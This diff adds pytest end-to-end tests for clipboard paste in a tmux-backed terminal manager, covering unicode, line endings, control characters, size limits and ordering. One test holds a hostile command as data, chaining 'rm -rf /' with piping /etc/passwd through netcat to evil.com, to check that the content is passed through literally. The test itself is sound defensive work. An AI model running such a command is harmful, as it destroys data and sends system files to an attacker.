@@ -1133,3 +1133,198 @@ class TestE2ECompleteFlows:
             manager._on_output("abc123def456", b"response")
             output = event_collector.get_output_events()
             assert len(output) == 5  # All 5 connections receive it
+
+
+# =============================================================================
+# E2E CLIPBOARD PASTE TESTS
+# =============================================================================
+
+
+class TestE2EClipboardPaste:
+    """E2E tests for clipboard paste functionality.
+
+    These tests verify that pasted content (via TerminalInput.data) is
+    correctly sent to tmux exactly as received, without interpretation.
+    """
+
+    @pytest.mark.asyncio
+    async def test_paste_simple_text(
+        self, manager, mock_session_provider, mock_tmux_executor
+    ):
+        """Simple text paste is sent to tmux."""
+        mock_session_provider.add_session("abc123def456", "ras-test-session")
+        manager._attachments["abc123def456"] = {"conn1"}
+
+        command = TerminalCommand(
+            input=TerminalInput(session_id="abc123def456", data=b"hello world")
+        )
+        await manager.handle_command("conn1", command)
+
+        assert len(mock_tmux_executor.sent_keys) == 1
+        assert mock_tmux_executor.sent_keys[0][1] == b"hello world"
+        assert mock_tmux_executor.sent_keys[0][2] is True  # literal
+
+    @pytest.mark.asyncio
+    async def test_paste_unicode_content(
+        self, manager, mock_session_provider, mock_tmux_executor
+    ):
+        """Unicode paste (CJK, emoji) is sent as UTF-8 bytes."""
+        mock_session_provider.add_session("abc123def456", "ras-test-session")
+        manager._attachments["abc123def456"] = {"conn1"}
+
+        # CJK text
+        cjk_bytes = "Hello 世界".encode("utf-8")
+        command = TerminalCommand(
+            input=TerminalInput(session_id="abc123def456", data=cjk_bytes)
+        )
+        await manager.handle_command("conn1", command)
+
+        assert mock_tmux_executor.sent_keys[-1][1] == cjk_bytes
+
+        # Emoji
+        emoji_bytes = "🎉🚀💻".encode("utf-8")
+        command = TerminalCommand(
+            input=TerminalInput(session_id="abc123def456", data=emoji_bytes)
+        )
+        await manager.handle_command("conn1", command)
+
+        assert mock_tmux_executor.sent_keys[-1][1] == emoji_bytes
+
+    @pytest.mark.asyncio
+    async def test_paste_multiline_content(
+        self, manager, mock_session_provider, mock_tmux_executor
+    ):
+        """Multiline paste preserves all line endings."""
+        mock_session_provider.add_session("abc123def456", "ras-test-session")
+        manager._attachments["abc123def456"] = {"conn1"}
+
+        # LF line endings
+        lf_content = b"line1\nline2\nline3"
+        command = TerminalCommand(
+            input=TerminalInput(session_id="abc123def456", data=lf_content)
+        )
+        await manager.handle_command("conn1", command)
+        assert mock_tmux_executor.sent_keys[-1][1] == lf_content
+
+        # CRLF line endings
+        crlf_content = b"line1\r\nline2\r\nline3"
+        command = TerminalCommand(
+            input=TerminalInput(session_id="abc123def456", data=crlf_content)
+        )
+        await manager.handle_command("conn1", command)
+        assert mock_tmux_executor.sent_keys[-1][1] == crlf_content
+
+    @pytest.mark.asyncio
+    async def test_paste_shell_metacharacters_sent_literally(
+        self, manager, mock_session_provider, mock_tmux_executor
+    ):
+        """Shell metacharacters in paste are sent literally, not executed."""
+        mock_session_provider.add_session("abc123def456", "ras-test-session")
+        manager._attachments["abc123def456"] = {"conn1"}
+
+        # Dangerous-looking content that should be sent literally
+        dangerous_content = b"; rm -rf / && cat /etc/passwd | nc evil.com 1234"
+        command = TerminalCommand(
+            input=TerminalInput(session_id="abc123def456", data=dangerous_content)
+        )
+        await manager.handle_command("conn1", command)
+
+        # Sent exactly as-is with literal=True
+        assert mock_tmux_executor.sent_keys[-1][1] == dangerous_content
+        assert mock_tmux_executor.sent_keys[-1][2] is True
+
+    @pytest.mark.asyncio
+    async def test_paste_at_max_size(
+        self, manager, mock_session_provider, mock_tmux_executor
+    ):
+        """Paste at exactly 64KB limit succeeds."""
+        mock_session_provider.add_session("abc123def456", "ras-test-session")
+        manager._attachments["abc123def456"] = {"conn1"}
+
+        # Exactly 64KB
+        max_content = b"x" * 65536
+        command = TerminalCommand(
+            input=TerminalInput(session_id="abc123def456", data=max_content)
+        )
+        await manager.handle_command("conn1", command)
+
+        assert len(mock_tmux_executor.sent_keys) == 1
+        assert len(mock_tmux_executor.sent_keys[0][1]) == 65536
+
+    @pytest.mark.asyncio
+    async def test_paste_over_max_size_rejected(
+        self, manager, mock_session_provider, mock_tmux_executor, event_collector
+    ):
+        """Paste over 64KB limit is rejected."""
+        mock_session_provider.add_session("abc123def456", "ras-test-session")
+        manager._attachments["abc123def456"] = {"conn1"}
+
+        # Over 64KB (client should truncate, but daemon validates too)
+        oversized = b"x" * 100000
+        command = TerminalCommand(
+            input=TerminalInput(session_id="abc123def456", data=oversized)
+        )
+        await manager.handle_command("conn1", command)
+
+        # Should be rejected
+        errors = event_collector.get_error_events()
+        assert len(errors) == 1
+        assert errors[0][1].error.error_code == "INPUT_TOO_LARGE"
+        assert len(mock_tmux_executor.sent_keys) == 0
+
+    @pytest.mark.asyncio
+    async def test_paste_control_characters(
+        self, manager, mock_session_provider, mock_tmux_executor
+    ):
+        """Control characters in paste are sent as-is."""
+        mock_session_provider.add_session("abc123def456", "ras-test-session")
+        manager._attachments["abc123def456"] = {"conn1"}
+
+        # Content with control characters
+        control_content = b"hello\x07world\x1b[31mred\x1b[0m"
+        command = TerminalCommand(
+            input=TerminalInput(session_id="abc123def456", data=control_content)
+        )
+        await manager.handle_command("conn1", command)
+
+        assert mock_tmux_executor.sent_keys[-1][1] == control_content
+
+    @pytest.mark.asyncio
+    async def test_paste_empty_is_noop(
+        self, manager, mock_session_provider, mock_tmux_executor
+    ):
+        """Empty paste is a no-op (handled client-side, but daemon accepts)."""
+        mock_session_provider.add_session("abc123def456", "ras-test-session")
+        manager._attachments["abc123def456"] = {"conn1"}
+
+        command = TerminalCommand(
+            input=TerminalInput(session_id="abc123def456", data=b"")
+        )
+        await manager.handle_command("conn1", command)
+
+        # Empty input is sent (daemon doesn't filter, client should)
+        # The daemon sends empty data to tmux send-keys -l ""
+        assert len(mock_tmux_executor.sent_keys) == 1
+        assert mock_tmux_executor.sent_keys[0][1] == b""
+
+    @pytest.mark.asyncio
+    async def test_paste_rapid_succession(
+        self, manager, mock_session_provider, mock_tmux_executor
+    ):
+        """Multiple rapid pastes are all delivered in order."""
+        mock_session_provider.add_session("abc123def456", "ras-test-session")
+        manager._attachments["abc123def456"] = {"conn1"}
+
+        # 10 rapid pastes
+        for i in range(10):
+            command = TerminalCommand(
+                input=TerminalInput(
+                    session_id="abc123def456", data=f"paste{i}".encode()
+                )
+            )
+            await manager.handle_command("conn1", command)
+
+        # All 10 delivered in order
+        assert len(mock_tmux_executor.sent_keys) == 10
+        for i, (_, data, _) in enumerate(mock_tmux_executor.sent_keys):
+            assert data == f"paste{i}".encode()
